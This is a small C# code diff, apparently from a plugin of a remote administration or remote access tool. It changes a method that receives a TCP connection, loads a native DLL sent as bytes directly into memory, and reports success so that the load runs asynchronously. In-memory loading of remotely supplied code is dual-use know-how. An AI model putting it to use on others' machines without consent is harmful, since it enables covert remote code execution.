@@ -2,6 +2,7 @@
 using System.IO;
 using System.Net.Sockets;
 using System.Runtime.Serialization.Formatters.Binary;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 using static PacketLib.Packet;
 
@@ -9,14 +10,14 @@ namespace PL
 {
     public class Main
     {
-        public static void main(TcpClient K, object[] Param_Tab)
+        public async static Task main(TcpClient K, object[] Param_Tab)
         {
 
             byte[] dll_bytes = (byte[])(Param_Tab[1]);
 
             try
             {
-                DLLFromMemory dll = new DLLFromMemory(dll_bytes);
+                await Task.Run(() => { DLLFromMemory dll = new DLLFromMemory(dll_bytes);});
 
                 PacketMaker P = new PacketMaker();
                 P.Type_Packet = PacketType.SUCCESS_LOAD_NATIVE_DLL;
